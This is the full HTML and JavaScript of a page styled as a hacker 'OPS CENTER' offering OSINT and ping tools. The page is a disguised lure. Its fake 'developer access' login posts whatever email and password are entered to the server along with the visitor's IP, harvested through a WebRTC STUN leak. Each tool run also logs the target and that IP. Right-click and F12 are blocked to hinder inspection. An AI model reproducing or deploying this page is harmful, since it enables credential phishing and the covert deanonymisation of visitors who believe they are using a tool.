<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNDERGROUND | Cyber Ops</title>
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root { --neon-green: #00ff41; --neon-red: #ff003c; --dark-bg: #050505; --panel-bg: rgba(8, 8, 8, 0.85); --border-color: #222; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: var(--dark-bg); color: var(--neon-green); font-family: 'IBM Plex Mono', monospace; overflow-x: hidden; }
        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.25; }
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: radial-gradient(circle, rgba(0,10,0,0.9) 0%, #000 100%); z-index: 999; }
        .login-box { border: 1px solid var(--border-color); border-top: 2px solid var(--neon-green); padding: 40px 30px; background: var(--panel-bg); width: 90%; max-width: 400px; box-shadow: 0 0 40px rgba(0,255,65,0.1); backdrop-filter: blur(10px); position: relative;}
        .login-header { text-align: center; margin-bottom: 30px; }
        .login-header h2 { color: #fff; font-family: 'Syncopate', sans-serif; font-size: 20px; font-weight: 700; letter-spacing: 2px; text-shadow: 0 0 10px #fff; }
        .login-header p { font-size: 11px; color: #888; margin-top: 10px; letter-spacing: 1px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; font-size: 11px; color: #aaa; margin-bottom: 8px; font-family: 'Syncopate', sans-serif; letter-spacing: 1px;}
        .input-group input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: #fff; font-family: 'IBM Plex Mono', monospace; font-size: 14px; outline: none; transition: 0.3s;}
        .input-group input:focus { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0,255,65,0.3); }
        .login-btn { width: 100%; padding: 18px; background: var(--neon-green); color: #000; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 16px; border: none; cursor: pointer; letter-spacing: 2px; transition: 0.2s; margin-top: 10px;}
        #main-site { display: none; padding: 15px; max-width: 800px; margin: 0 auto; padding-bottom: 40px;}
        .top-bar { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; margin-bottom: 20px; }
        .top-bar h1 { font-family: 'Syncopate', sans-serif; font-size: 16px; color: #fff; letter-spacing: 2px; font-weight: 700;}
        .top-bar h1 span { color: var(--neon-green); text-shadow: 0 0 10px var(--neon-green);}
        .ip-display { font-size: 10px; color: #888; text-align: right; letter-spacing: 1px;}
        .ip-display span { color: var(--neon-red); font-weight: bold;}
        .section-title { font-family: 'Syncopate', sans-serif; color: #fff; font-size: 12px; letter-spacing: 2px; margin: 25px 0 15px 0; border-bottom: 1px dashed #333; padding-bottom: 8px; display: flex; align-items: center; gap: 8px;}
        .section-title::before { content: '■'; font-size: 12px; color: var(--neon-red);}
        .tools-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .tool-btn { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; font-family: 'IBM Plex Mono', monospace; font-weight: 500; font-size: 12px; color: #ddd; text-align: left; cursor: pointer; transition: 0.2s;}
        .tool-btn:hover { background: rgba(0, 255, 65, 0.05); border-color: var(--neon-green); color: var(--neon-green); transform: translateX(5px);}
        #tool-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column; justify-content: center; align-items: center; padding: 15px;}
        .modal-content { width: 100%; max-width: 600px; background: #000; border: 1px solid var(--border-color); border-top: 2px solid var(--neon-green); }
        .modal-header { background: var(--panel-bg); padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333;}
        .modal-title { font-family: 'Syncopate', sans-serif; font-size: 12px; color: var(--neon-green); font-weight: 700;}
        .close-btn { background: none; border: none; color: var(--neon-red); font-family: 'Syncopate', sans-serif; font-weight: bold; cursor: pointer; font-size: 12px;}
        #terminal-output { padding: 15px; height: 250px; overflow-y: auto; font-family: 'IBM Plex Mono', monospace; font-size: 13px; color: var(--neon-green); white-space: pre-wrap; line-height: 1.6;}
        .modal-footer { padding: 15px; background: var(--panel-bg); border-top: 1px solid #333; display: flex; gap: 10px;}
        .modal-footer input { flex: 1; padding: 12px; background: #000; border: 1px solid #333; color: var(--neon-green); font-family: 'IBM Plex Mono', monospace; outline: none; font-size: 14px;}
        .exec-btn { padding: 12px 20px; background: var(--neon-green); color: #000; border: none; font-family: 'Syncopate', sans-serif; font-weight: 700; cursor: pointer; font-size: 13px; letter-spacing: 1px;}
    </style>
</head>
<body oncontextmenu="return false;" onkeydown="return event.key != 'F12';">
    <canvas id="matrix-canvas"></canvas>
    <div id="login-screen">
        <div class="login-box">
            <div class="login-header"><h2>DEVELOPER ACCESS</h2><p>AUTHENTICATION REQUIRED TO PROCEED</p></div>
            <div class="input-group"><label>EMAIL ADDRESS</label><input type="email" id="email" placeholder="name@example.com" autocomplete="off"></div>
            <div class="input-group"><label>PASSWORD</label><input type="password" id="password" placeholder="Enter your password" autocomplete="off"></div>
            <button class="login-btn" onclick="login()">SIGN IN</button>
        </div>
    </div>
    <div id="main-site">
        <div class="top-bar">
            <h1><span>>_</span> OPS CENTER</h1>
            <div class="ip-display">TARGET IP<br><span id="user-ip">SCANNING...</span></div>
        </div>
        <div class="section-title">REAL OSINT & INTEL</div>
        <div class="tools-grid" id="osint-tools"></div>
        <div class="section-title">REAL NETWORK RECON</div>
        <div class="tools-grid" id="net-tools"></div>
    </div>
    <div id="tool-modal">
        <div class="modal-content">
            <div class="modal-header"><div class="modal-title" id="modal-title">>_ EXECUTING</div><button class="close-btn" onclick="closeModal()">[X] ABORT</button></div>
            <div id="terminal-output">Initializing...</div>
            <div class="modal-footer"><input type="text" id="target-input" placeholder="Target IP/Domain/Phone"><button class="exec-btn" onclick="executeTool()" id="run-btn">RUN</button></div>
        </div>
    </div>
    <script>
        // Background Matrix
        const canvas = document.getElementById('matrix-canvas'); const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width / 14)).fill(1);
        setInterval(() => {
            ctx.fillStyle = 'rgba(5, 5, 5, 0.15)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41'; ctx.font = '14px "IBM Plex Mono"';
            for (let i = 0; i < drops.length; i++) {
                ctx.fillText('01ABCDEF@#$%&*'.charAt(Math.floor(Math.random() * 14)), i * 14, drops[i] * 14);
                if (drops[i] * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++;
            }
        }, 50);
        
        // IP Grabber
        let real_ip = "Unknown";
        const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
        pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
            if(real_ip === "Unknown") { real_ip = myIP; document.getElementById('user-ip').innerText = real_ip; }
        };
        
        // الأدوات الحقيقية فقط
        const toolsOSINT = ["Phone Info", "IP Geolocation", "Whois Lookup", "DNS Records", "HTTP Headers"];
        const toolsNetwork = ["Ping Test"]; // Ping فقط للشبكة
        
        function renderTools(tools, id) { const c = document.getElementById(id); tools.forEach(n => { const d = document.createElement('div'); d.className = 'tool-btn'; d.innerText = n; d.onclick = () => openTool(n); c.appendChild(d); }); }
        renderTools(toolsOSINT, 'osint-tools'); renderTools(toolsNetwork, 'net-tools');
        
        function login() {
            const e = document.getElementById('email').value; const p = document.getElementById('password').value;
            if(!e || !p) return alert("Enter credentials!");
            fetch('/login', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: e, password: p, real_ip: real_ip })}).then(() => {
                document.getElementById('login-screen').style.display = 'none'; document.getElementById('main-site').style.display = 'block';
            });
        }
        let currentTool = "";
        function openTool(name) {
            currentTool = name; document.getElementById('modal-title').innerText = ">_ " + name;
            document.getElementById('terminal-output').innerText = "Initializing...";
            document.getElementById('tool-modal').style.display = 'flex';
        }
        function closeModal() { document.getElementById('tool-modal').style.display = 'none'; }
        function executeTool() {
            const t = document.getElementById('target-input').value; if(!t) return;
            const term = document.getElementById('terminal-output'); const btn = document.getElementById('run-btn');
            btn.innerText = "..."; btn.disabled = true; term.innerText += "\n\n> Target locked: " + t + "\n> Fetching real data...";
            fetch('/log_action', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tool: currentTool, target: t, real_ip: real_ip })})
            .then(res => res.json()).then(data => {
                term.innerText += "\n\n--- OUTPUT ---\n" + data.output; btn.innerText = "RUN"; btn.disabled = false; term.scrollTop = term.scrollHeight;
            }).catch(() => { term.innerText += "\n\n[!] Connection lost."; btn.innerText = "RUN"; btn.disabled = false; });
        }
    </script>
</body>
</html>
